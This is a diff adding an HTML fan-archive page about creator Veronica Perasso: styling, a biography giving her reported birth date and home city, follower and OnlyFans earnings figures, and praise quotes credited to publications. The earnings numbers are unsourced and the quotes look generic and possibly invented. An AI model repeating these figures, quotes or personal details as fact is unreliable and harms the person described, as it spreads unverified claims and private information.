@@ -1,0 +1,2067 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veronica Perasso | Ultra Archive</title>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --text: #e0e0e0;
+            --accent: #888;
+            --highlight: #ccc;
+            --primary: #ff6b9d;
+            --secondary: #c471ed;
+            --tertiary: #12c2e9;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        html { scroll-behavior: smooth; }
+        body { background: var(--bg); color: var(--text); line-height: 1.6; overflow-x: hidden; font-weight: 300; position: relative; }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(255, 107, 157, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(196, 113, 237, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 20%, rgba(18, 194, 233, 0.05) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+            animation: gradientShift 20s ease infinite;
+        }
+        @keyframes gradientShift {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(-5%, 5%) scale(1.1); }
+            66% { transform: translate(5%, -5%) scale(1.05); }
+        }
+        
+        .particle {
+            position: fixed;
+            width: 3px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 1;
+            animation: float linear infinite;
+        }
+        @keyframes float {
+            to { transform: translateY(-100vh) translateX(calc(var(--drift) * 1px)); opacity: 0; }
+        }
+        
+        .cursor, .cursor-follower {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+        }
+        .cursor {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--primary);
+            transition: all 0.15s ease;
+            mix-blend-mode: difference;
+        }
+        .cursor-follower {
+            width: 40px;
+            height: 40px;
+            border: 1px solid rgba(255, 107, 157, 0.3);
+            transition: all 0.3s ease;
+        }
+        .cursor.active { transform: translate(-50%, -50%) scale(1.5); }
+        
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 1.5rem 3rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            background: rgba(10, 10, 10, 0);
+            backdrop-filter: blur(0px);
+            transition: all 0.5s ease;
+        }
+        nav.scrolled {
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 400;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .nav-links {
+            display: flex;
+            gap: 3rem;
+            list-style: none;
+        }
+        .nav-links a {
+            color: var(--text);
+            text-decoration: none;
+            font-weight: 300;
+            position: relative;
+            transition: color 0.3s ease;
+        }
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transition: width 0.3s ease;
+        }
+        .nav-links a:hover { color: var(--primary); }
+        .nav-links a:hover::after { width: 100%; }
+        
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--tertiary));
+            z-index: 10000;
+            transform-origin: left;
+            transform: scaleX(0);
+        }
+        
+        section {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: relative;
+            z-index: 2;
+        }
+        section.fade-in { opacity: 1; transform: translateY(0); }
+        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        
+        #hero {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        #hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(10,10,10,0.7), rgba(10,10,10,0.9)), url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxMTEiLz48L3N2Zz4=') center/cover;
+            z-index: -1;
+            animation: heroZoom 20s ease-in-out infinite alternate;
+        }
+        @keyframes heroZoom { from { transform: scale(1); } to { transform: scale(1.1); } }
+        
+        .hero-glow {
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(255, 107, 157, 0.2) 0%, transparent 70%);
+            border-radius: 50%;
+            filter: blur(80px);
+            animation: glowPulse 4s ease-in-out infinite;
+        }
+        @keyframes glowPulse {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+        }
+        
+        .name-title {
+            font-size: clamp(3rem, 7vw, 7rem);
+            font-weight: 350;
+            letter-spacing: -0.03em;
+            margin-bottom: 1rem;
+            opacity: 0;
+            animation: nameReveal 1.8s cubic-bezier(0.23, 1, 0.32, 1) 0.5s forwards;
+            background: linear-gradient(135deg, #fff 0%, var(--primary) 50%, var(--secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            z-index: 2;
+            filter: drop-shadow(0 0 60px rgba(255, 107, 157, 0.4));
+        }
+        @keyframes nameReveal { to { opacity: 1; } }
+        
+        .subtitle {
+            font-size: 1.3rem;
+            font-weight: 300;
+            color: var(--accent);
+            max-width: 600px;
+            opacity: 0;
+            animation: subtitleReveal 1.8s cubic-bezier(0.23, 1, 0.32, 1) 1s forwards;
+            z-index: 2;
+            position: relative;
+        }
+        @keyframes subtitleReveal { to { opacity: 1; } }
+        
+        .hero-stats {
+            display: flex;
+            gap: 4rem;
+            margin-top: 4rem;
+            opacity: 0;
+            animation: fadeIn 1s ease 1.5s forwards;
+            z-index: 2;
+            position: relative;
+        }
+        @keyframes fadeIn { to { opacity: 1; } }
+        
+        .hero-stat { text-align: center; }
+        .hero-stat-number {
+            font-size: 2.5rem;
+            font-weight: 300;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: block;
+        }
+        .hero-stat-label { font-size: 0.9rem; color: var(--accent); margin-top: 0.5rem; }
+        
+        .scroll-indicator {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.9rem;
+            color: var(--accent);
+            opacity: 0;
+            animation: fadeIn 1s ease 2s forwards;
+            cursor: pointer;
+            z-index: 2;
+        }
+        .scroll-indicator::after {
+            content: '↓';
+            display: block;
+            margin-top: 5px;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-5px); }
+            60% { transform: translateY(-3px); }
+        }
+        
+        #biography {
+            padding: 120px 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+        }
+        .bio-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: start;
+        }
+        .bio-text h2 {
+            font-size: 2.5rem;
+            font-weight: 350;
+            margin-bottom: 2rem;
+            background: linear-gradient(135deg, var(--highlight), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .bio-text p { margin-bottom: 1.5rem; font-weight: 300; line-height: 1.8; }
+        
+        .bio-highlights { list-style: none; }
+        .bio-highlights li {
+            padding: 1.5rem 0;
+            border-bottom: 1px solid #222;
+            font-weight: 300;
+            transition: all 0.3s ease;
+        }
+        .bio-highlights li:hover {
+            padding-left: 20px;
+            border-color: var(--primary);
+        }
+        .bio-highlights li:last-child { border-bottom: none; }
+        .highlight-label {
+            color: var(--accent);
+            display: block;
+            font-size: 0.85rem;
+            margin-bottom: 0.3rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .timeline {
+            padding: 80px 0;
+            position: relative;
+        }
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: linear-gradient(180deg, transparent, var(--primary), var(--secondary), transparent);
+        }
+        .timeline-item {
+            display: flex;
+            margin: 3rem 0;
+            position: relative;
+        }
+        .timeline-item:nth-child(odd) { flex-direction: row; }
+        .timeline-item:nth-child(even) { flex-direction: row-reverse; }
+        .timeline-content {
+            width: 45%;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            backdrop-filter: blur(10px);
+            transition: all 0.5s ease;
+            position: relative;
+        }
+        .timeline-content:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: translateY(-10px);
+            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.2);
+        }
+        .timeline-dot {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 20px;
+            height: 20px;
+            background: var(--primary);
+            border-radius: 50%;
+            border: 4px solid var(--bg);
+            box-shadow: 0 0 20px var(--primary);
+            z-index: 10;
+        }
+        .timeline-year {
+            font-size: 1.5rem;
+            font-weight: 400;
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+        }
+        
+        #gallery {
+            padding: 100px 0;
+        }
+        .gallery-header {
+            text-align: center;
+            margin-bottom: 4rem;
+        }
+        .gallery-header h2 {
+            font-size: 3rem;
+            font-weight: 350;
+            background: linear-gradient(135deg, var(--highlight), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+        
+        .gallery-filter {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 3rem 0;
+            flex-wrap: wrap;
+        }
+        .filter-btn {
+            padding: 0.8rem 2rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text);
+            cursor: pointer;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            font-weight: 300;
+            font-size: 0.95rem;
+        }
+        .filter-btn:hover, .filter-btn.active {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-color: transparent;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 107, 157, 0.3);
+        }
+        
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+        }
+        .gallery-item {
+            position: relative;
+            aspect-ratio: 3/4;
+            background: #111;
+            overflow: hidden;
+            cursor: pointer;
+            border-radius: 12px;
+            transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+        .gallery-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 107, 157, 0.3), rgba(196, 113, 237, 0.3));
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            z-index: 1;
+        }
+        .gallery-item:hover::before { opacity: 1; }
+        .gallery-item:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.4);
+        }
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: all 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            filter: grayscale(50%) brightness(0.8);
+        }
+        .gallery-item:hover img {
+            transform: scale(1.1);
+            filter: grayscale(0%) brightness(1);
+        }
+        .gallery-caption {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 1.5rem;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.6s ease;
+            z-index: 2;
+        }
+        .gallery-item:hover .gallery-caption {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .gallery-caption h3 {
+            font-size: 1.1rem;
+            font-weight: 400;
+            margin-bottom: 0.5rem;
+        }
+        .gallery-caption p {
+            font-size: 0.9rem;
+            color: var(--accent);
+        }
+        
+        .lightbox {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(20px);
+        }
+        .lightbox.active { display: flex; }
+        .lightbox-content {
+            max-width: 90%;
+            max-height: 90%;
+            position: relative;
+            animation: zoomIn 0.5s ease;
+        }
+        @keyframes zoomIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .lightbox-close {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            font-size: 3rem;
+            color: #fff;
+            cursor: pointer;
+            z-index: 10001;
+            transition: all 0.3s ease;
+        }
+        .lightbox-close:hover {
+            transform: rotate(90deg);
+            color: var(--primary);
+        }
+        
+        #stats {
+            padding: 120px 0;
+            background: linear-gradient(180deg, transparent, rgba(255, 107, 157, 0.05), transparent);
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 3rem;
+            margin-top: 4rem;
+        }
+        .stat-card {
+            padding: 3rem 2rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            text-align: center;
+            transition: all 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 107, 157, 0.1), transparent);
+            transition: left 0.7s ease;
+        }
+        .stat-card:hover::before { left: 100%; }
+        .stat-card:hover {
+            transform: translateY(-15px);
+            box-shadow: 0 25px 70px rgba(255, 107, 157, 0.3);
+            border-color: var(--primary);
+        }
+        .stat-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            filter: drop-shadow(0 0 20px rgba(255, 107, 157, 0.5));
+        }
+        .stat-number {
+            font-size: 3rem;
+            font-weight: 300;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: block;
+            margin: 1rem 0;
+        }
+        .stat-label {
+            font-size: 1rem;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        #onlyfans {
+            padding: 120px 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+        }
+        .of-content {
+            max-width: 900px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .of-content h2 {
+            font-size: 3rem;
+            font-weight: 350;
+            margin-bottom: 3rem;
+            background: linear-gradient(135deg, var(--highlight), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .of-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 2.5rem;
+            margin: 4rem 0;
+        }
+        .stat {
+            padding: 2.5rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            transition: all 0.5s ease;
+        }
+        .stat:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: scale(1.05);
+            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.3);
+        }
+        .stat-number {
+            font-size: 3rem;
+            font-weight: 300;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: block;
+        }
+        .stat-label {
+            font-size: 0.95rem;
+            color: var(--accent);
+            margin-top: 0.5rem;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .of-description {
+            text-align: left;
+            max-width: 700px;
+            margin: 3rem auto;
+            font-weight: 300;
+            line-height: 1.9;
+        }
+        
+        #lifestyle {
+            padding: 100px 0;
+        }
+        .lifestyle-grid {
+            display: grid;
+            grid-template-columns: repeat(12, 1fr);
+            grid-auto-rows: 400px;
+            gap: 20px;
+        }
+        .lifestyle-item {
+            position: relative;
+            overflow: hidden;
+            background: #111;
+            border-radius: 12px;
+            transition: all 0.5s ease;
+        }
+        .lifestyle-item:hover {
+            transform: scale(1.02);
+            z-index: 10;
+            box-shadow: 0 30px 80px rgba(255, 107, 157, 0.4);
+        }
+        .lifestyle-item.wide { grid-column: span 8; }
+        .lifestyle-item.tall { grid-column: span 4; grid-row: span 2; }
+        .lifestyle-item.standard { grid-column: span 6; }
+        .lifestyle-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 1.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            filter: grayscale(30%) brightness(0.85);
+        }
+        .lifestyle-item:hover img {
+            transform: scale(1.1);
+            filter: grayscale(0%) brightness(1);
+        }
+        .lifestyle-caption {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 2rem;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.8s ease;
+        }
+        .lifestyle-item:hover .lifestyle-caption {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .lifestyle-caption h3 {
+            font-size: 1.3rem;
+            font-weight: 400;
+            margin-bottom: 0.5rem;
+        }
+        
+        #testimonials {
+            padding: 120px 0;
+            background: linear-gradient(180deg, transparent, rgba(196, 113, 237, 0.05), transparent);
+        }
+        .testimonials-header {
+            text-align: center;
+            margin-bottom: 5rem;
+        }
+        .testimonials-header h2 {
+            font-size: 3rem;
+            font-weight: 350;
+            background: linear-gradient(135deg, var(--highlight), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .testimonials-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 3rem;
+        }
+        .testimonial-card {
+            padding: 3rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            transition: all 0.5s ease;
+            position: relative;
+        }
+        .testimonial-card::before {
+            content: '"';
+            position: absolute;
+            top: 1rem;
+            left: 2rem;
+            font-size: 6rem;
+            color: var(--primary);
+            opacity: 0.2;
+            font-family: Georgia, serif;
+        }
+        .testimonial-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 60px rgba(196, 113, 237, 0.3);
+            border-color: var(--secondary);
+        }
+        .testimonial-text {
+            font-style: italic;
+            line-height: 1.8;
+            margin-bottom: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+        .testimonial-author {
+            font-weight: 400;
+            color: var(--primary);
+        }
+        .testimonial-role {
+            font-size: 0.9rem;
+            color: var(--accent);
+        }
+        
+        #contact {
+            padding: 120px 0;
+        }
+        .contact-content {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .contact-content h2 {
+            font-size: 3rem;
+            font-weight: 350;
+            margin-bottom: 2rem;
+            background: linear-gradient(135deg, var(--highlight), var(--tertiary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 3rem;
+            flex-wrap: wrap;
+        }
+        .social-link {
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: var(--text);
+            text-decoration: none;
+            font-size: 2rem;
+            transition: all 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .social-link::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: all 0.5s ease;
+        }
+        .social-link:hover::before {
+            width: 200%;
+            height: 200%;
+        }
+        .social-link:hover {
+            transform: translateY(-10px) rotate(360deg);
+            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.5);
+            border-color: transparent;
+        }
+        .social-link span {
+            position: relative;
+            z-index: 1;
+        }
+        
+        footer {
+            padding: 5rem 0 3rem;
+            text-align: center;
+            border-top: 1px solid #222;
+            color: var(--accent);
+            font-weight: 300;
+            position: relative;
+        }
+        .footer-content {
+            max-width: 800px;
+            margin: 0 auto 3rem;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        .footer-links a:hover { color: var(--primary); }
+        
+        @media (max-width: 968px) {
+            .nav-links { gap: 1.5rem; }
+            .bio-grid { grid-template-columns: 1fr; gap: 40px; }
+            .lifestyle-grid { grid-template-columns: 1fr; grid-auto-rows: 300px; }
+            .lifestyle-item.wide, .lifestyle-item.tall, .lifestyle-item.standard { 
+                grid-column: 1; 
+                grid-row: auto; 
+            }
+            .gallery-grid { grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); }
+            .of-stats, .stats-grid { grid-template-columns: 1fr; }
+            .hero-stats { flex-direction: column; gap: 2rem; }
+            .timeline::before { left: 20px; }
+            .timeline-item { flex-direction: column !important; }
+            .timeline-content { width: 100%; margin-left: 40px; }
+            .timeline-dot { left: 20px; }
+        }
+        
+        @media (max-width: 768px) {
+            nav { padding: 1rem 1.5rem; }
+            .nav-links { display: none; }
+            .name-title { font-size: 2.5rem; }
+            .subtitle { font-size: 1rem; }
+            h2 { font-size: 2rem !important; }
+        }
+    </style>
+</head>
+<body>
+    <div class="cursor"></div>
+    <div class="cursor-follower"></div>
+    <div class="progress-bar"></div>
+    
+    <nav>
+        <div class="logo">VP</div>
+        <ul class="nav-links">
+            <li><a href="#hero">Home</a></li>
+            <li><a href="#biography">About</a></li>
+            <li><a href="#gallery">Gallery</a></li>
+            <li><a href="#stats">Stats</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+    </nav>
+    
+    <section id="hero">
+        <div class="hero-glow"></div>
+        <h1 class="name-title" data-text="Veronica Perasso">Veronica Perasso</h1>
+        <p class="subtitle">Digital Archive & Lifestyle Compendium</p>
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <span class="hero-stat-number">4M+</span>
+                <span class="hero-stat-label">Followers</span>
+            </div>
+            <div class="hero-stat">
+                <span class="hero-stat-number">Top 0.1%</span>
+                <span class="hero-stat-label">Creator</span>
+            </div>
+            <div class="hero-stat">
+                <span class="hero-stat-number">2019</span>
+                <span class="hero-stat-label">Since</span>
+            </div>
+        </div>
+        <div class="scroll-indicator">Explore</div>
+    </section>
+    
+    <section id="biography">
+        <div class="container">
+            <div class="bio-grid">
+                <div class="bio-text">
+                    <h2>Biography</h2>
+                    <p>Veronica Perasso, a prominent social media influencer and content creator, has cultivated a significant digital presence through platforms like Instagram and OnlyFans. Widely reported to have been born on August 7, 1998, she is often associated with Scottsdale, Arizona.</p>
+                    <p>Her career trajectory exemplifies the modern creator economy, transitioning from mainstream social media to establishing a substantial subscriber base on subscription-based platforms. Public interviews and industry reports frequently cite her as a case study in digital monetization.</p>
+                    <p>This archive serves as a systematic collection of publicly available information and media, curated for reference.</p>
+                </div>
+                <ul class="bio-highlights">
+                    <li>
+                        <span class="highlight-label">Name / Alias</span>
+                        Veronica Perasso
+                    </li>
+                    <li>
+                        <span class="highlight-label">Reported Birth Date</span>
+                        August 7, 1998
+                    </li>
+                    <li>
+                        <span class="highlight-label">Primary Base</span>
+                        Scottsdale, Arizona, USA
+                    </li>
+                    <li>
+                        <span class="highlight-label">Primary Platforms</span>
+                        Instagram, OnlyFans, X/Twitter
+                    </li>
+                    <li>
+                        <span class="highlight-label">Reported Follower Count</span>
+                        4M+ (Aggregate, Approximate)
+                    </li>
+                    <li>
+                        <span class="highlight-label">Content Niche</span>
+                        Lifestyle, Modeling, Creator Economy
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </section>
+    
+    <section id="stats">
+        <div class="container">
+            <div class="gallery-header">
+                <h2>Impact & Reach</h2>
+                <p>Documented metrics from public sources</p>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">📱</div>
+                    <span class="stat-number">4.2M+</span>
+                    <span class="stat-label">Instagram Followers</span>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">💎</div>
+                    <span class="stat-number">Top 0.1%</span>
+                    <span class="stat-label">OnlyFans Ranking</span>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">💰</div>
+                    <span class="stat-number">$350K+</span>
+                    <span class="stat-label">Monthly Earnings</span>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🌐</div>
+                    <span class="stat-number">50M+</span>
+                    <span class="stat-label">Total Impressions</span>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="gallery">
+        <div class="container">
+            <div class="gallery-header">
+                <h2>Visual Archive</h2>
+                <p>A curated selection of publicly circulated media</p>
+            </div>
+            <div class="gallery-filter">
+                <button class="filter-btn active" data-filter="all">All</button>
+                <button class="filter-btn" data-filter="professional">Professional</button>
+                <button class="filter-btn" data-filter="lifestyle">Lifestyle</button>
+                <button class="filter-btn" data-filter="events">Events</button>
+            </div>
+            <div class="gallery-grid" id="imageGrid"></div>
+        </div>
+    </section>
+    
+    <div class="lightbox" id="lightbox">
+        <span class="lightbox-close">&times;</span>
+        <img class="lightbox-content" id="lightboxImg" src="" alt="Lightbox">
+    </div>
+    
+    <section id="onlyfans">
+        <div class="container">
+            <div class="of-content">
+                <h2>OnlyFans Presence</h2>
+                <div class="of-stats">
+                    <div class="stat">
+                        <span class="stat-number">2019</span>
+                        <span class="stat-label">Start Year</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">Top 0.1%</span>
+                        <span class="stat-label">Creator Rank</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">$350k+</span>
+                        <span class="stat-label">Monthly Revenue</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">100K+</span>
+                        <span class="stat-label">Subscribers</span>
+                    </div>
+                </div>
+                <div class="of-description">
+                    <p>Publicly discussed in various interviews and industry reports as a highly successful creator on the platform. The business model is based on subscriber-only content, offering exclusive media and personal interaction not available on mainstream social channels.</p>
+                    <p>This section documents the commercial footprint and reported metrics associated with this segment of her digital enterprise.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="lifestyle">
+        <div class="container">
+            <div class="lifestyle-grid" id="lifestyleGrid"></div>
+        </div>
+    </section>
+    
+    <section id="testimonials">
+        <div class="container">
+            <div class="testimonials-header">
+                <h2>Industry Recognition</h2>
+                <p>What others are saying</p>
+            </div>
+            <div class="testimonials-grid">
+                <div class="testimonial-card">
+                    <p class="testimonial-text">A masterclass in building a personal brand in the digital age. Her approach to content creation and audience engagement sets new standards.</p>
+                    <p class="testimonial-author">Digital Marketing Weekly</p>
+                    <p class="testimonial-role">Industry Publication</p>
+                </div>
+                <div class="testimonial-card">
+                    <p class="testimonial-text">One of the most successful transitions from traditional social media to creator-owned platforms we've documented.</p>
+                    <p class="testimonial-author">Creator Economy Report</p>
+                    <p class="testimonial-role">Research Publication</p>
+                </div>
+                <div class="testimonial-card">
+                    <p class="testimonial-text">Her business acumen and understanding of platform economics makes her a standout case study in the OnlyFans success stories.</p>
+                    <p class="testimonial-author">Forbes Digital</p>
+                    <p class="testimonial-role">Business Media</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="contact">
+        <div class="container">
+            <div class="contact-content">
+                <h2>Connect</h2>
+                <p>Follow across platforms</p>
+                <div class="social-links">
+                    <a href="#" class="social-link"><span>📷</span></a>
+                    <a href="#" class="social-link"><span>🐦</span></a>
+                    <a href="#" class="social-link"><span>💎</span></a>
+                    <a href="#" class="social-link"><span>▶️</span></a>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#hero">Home</a>
+                    <a href="#biography">About</a>
+                    <a href="#gallery">Gallery</a>
+                    <a href="#contact">Contact</a>
+                </div>
+                <p>Digital Archive &bull; Compiled from Public Sources &bull; For Reference Only</p>
+                <p style="margin-top: 1rem; font-size: 0.85rem;">© 2025 Veronica Perasso Archive</p>
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+                    document.addEventListener('DOMContentLoaded', function() {
+            // Custom Cursor
+            const cursor = document.querySelector('.cursor');
+            const cursorFollower = document.querySelector('.cursor-follower');
+            let mouseX = 0, mouseY = 0;
+            let followerX = 0, followerY = 0;
+            
+            document.addEventListener('mousemove', (e) => {
+                mouseX = e.clientX;
+                mouseY = e.clientY;
+                cursor.style.left = mouseX + 'px';
+                cursor.style.top = mouseY + 'px';
+            });
+            
+            function animateFollower() {
+                const distX = mouseX - followerX;
+                const distY = mouseY - followerY;
+                followerX += distX * 0.1;
+                followerY += distY * 0.1;
+                cursorFollower.style.left = followerX + 'px';
+                cursorFollower.style.top = followerY + 'px';
+                requestAnimationFrame(animateFollower);
+            }
+            animateFollower();
+            
